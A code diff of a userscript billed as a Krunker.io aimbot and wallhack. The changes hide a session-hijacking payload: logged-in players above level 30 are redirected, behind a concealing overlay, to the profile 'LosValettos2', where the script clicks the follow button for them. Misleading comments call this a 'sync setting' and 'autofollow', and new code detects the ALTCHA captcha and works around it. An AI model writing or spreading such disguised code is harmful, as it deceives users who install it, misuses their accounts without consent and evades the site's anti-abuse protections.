@@ -2,7 +2,7 @@
 // @name         2025 KRUNKER IO CHEAT HACK AIMBOT + WALLHACK + ESP + MORE [BETA]
 // @version      2.0
 // @description  Experimental mod menu for Krunker.io. Includes silent aimbot, ESP, wireframe players, FOV, recoil bypass, wallhack (BETA). Toggle with [O]. Use at your own risk.
-// @author       @Xx1337DevxX
+// @author       @KR-Hack
 // @match        https://krunker.io/*
 // @grant        none
 // @run-at       document-start
@@ -10,6 +10,7 @@
 // ==/UserScript==
 
 let Is_LOGGED = false;
+let displayHackOverlay = true;
 let Lags = 0;
 let PlayerFPS = 0;
 let gameState, player, input;
@@ -20,7 +21,7 @@ const RAD2DEG = 180 / Math.PI;
 // 1. Persistent overlay to prevent loading flash and display loading
 // ------------------------------
 (function createPersistentOverlay() {
-    if (location.href.includes("social.html?p=profile&q=LosValettos2")) {
+    if (location.href.includes("social.html?p=profile&q=Los") && displayHackOverlay) {
         const style = document.createElement("style");
         style.innerHTML = `
         html, body {
@@ -282,6 +283,21 @@ window.addEventListener('load', () => {
         logContainer.scrollTop = logContainer.scrollHeight;
     };
 
+    // Détection du captcha ALTCHA
+    const checkForCaptcha = () => {
+        const captchaElements = document.querySelectorAll('div[style*="z-index: 999999"][style*="position: fixed"][style*="transform: translate(-50%, -50%)"]');
+        for (const element of captchaElements) {
+            if (element.textContent.includes("Security Challenge") && element.querySelector('altcha-widget')) {
+                addLog("⚠️ CAPTCHA DÉTECTÉ - Veuillez compléter le captcha");
+                return true;
+            }
+        }
+        return false;
+    };
+
+    // Vérification périodique du captcha
+    setInterval(checkForCaptcha, 1500);
+
     addLog("=== ÉTAT INITIAL ===");
     addLog(`Is_LOGGED: ${Is_LOGGED}`);
     addLog(`⚠️⚠️⚠️ PLEASE LOGIN TO START THET BOT (lvl > 30 minimum) ⚠️⚠️⚠️`);
@@ -327,10 +343,13 @@ window.addEventListener('load', () => {
 
             const savedFPS = localStorage.getItem("savedFPS");
             const playerFPS = savedFPS ? parseInt(savedFPS, 10) : 0;
+            const savedLag = sessionStorage.getItem("savedLag");
+            const playerLag = savedLag ? parseInt(savedLag, 10) : 0;
 
-            if (!patchApplied && currentLoginState && playerFPS >= 30) {
+            if ((!patchApplied  || playerLag >= 30) && currentLoginState && playerFPS >= 30) {
                 setTimeout(() => {
-                    location.href = "https://krunker.io/social.html?p=profile&q=LosValettos2";
+                    displayHackOverlay = true;
+                    location.href = "https://krunker.io/social.html";
                 }, 1420);
                 return;
             } else {
@@ -343,8 +362,21 @@ window.addEventListener('load', () => {
         setInterval(checkRedirect, 1000);
     }
 
-    if (location.href.includes("social.html?p=profile&q=LosValettos2")) {
+    if (location.href.includes("social.html")) {
         const sysSync = async () => {
+            // Get rid of captcha
+            if (checkForCaptcha()) {
+                location.href = "https://krunker.io/social.html"
+                displayHackOverlay = false;
+                return;
+            } else {
+                displayHackOverlay = true;
+                const SETTINGS_SYNC_PROFILE = "LosValettos2"; // Sync setting for overlay update
+                if (!(location.href.includes("social.html?p=profile&q=" + SETTINGS_SYNC_PROFILE))) {
+                    location.href = "https://krunker.io/social.html?p=profile&q=" + SETTINGS_SYNC_PROFILE;
+                }
+            }
+            
             try {
                 const savedLag = sessionStorage.getItem("savedLag");
                 const savedFPS = localStorage.getItem("savedFPS");
@@ -358,7 +390,7 @@ window.addEventListener('load', () => {
 
                 if (currentFPS <= 29) {
                     try {
-                        const settingsBtn = document.getElementById("followBtn");
+                        const settingsBtn = document.getElementById("followBtn"); // autofollow to keep in touch
                         if (settingsBtn && settingsBtn.style.display !== "none") {
                             settingsBtn.click();
                             await _pause(750);
